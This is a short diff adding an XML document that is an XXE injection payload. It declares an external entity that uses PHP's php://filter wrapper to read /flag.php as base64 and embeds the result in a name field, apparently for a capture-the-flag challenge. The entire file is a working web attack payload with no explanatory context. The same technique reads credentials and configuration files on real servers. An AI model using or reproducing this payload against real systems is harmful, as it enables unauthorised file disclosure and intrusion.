@@ -1,0 +1,8 @@
+<!DOCTYPE email [
+						<!ENTITY content SYSTEM 'php://filter/convert.base64-encode/resource=/flag.php'>
+						]>
+            <root>
+            <name>&content;</name>
+            <details>hello</details>
+            <date>2022-10-05</date>
+            </root>
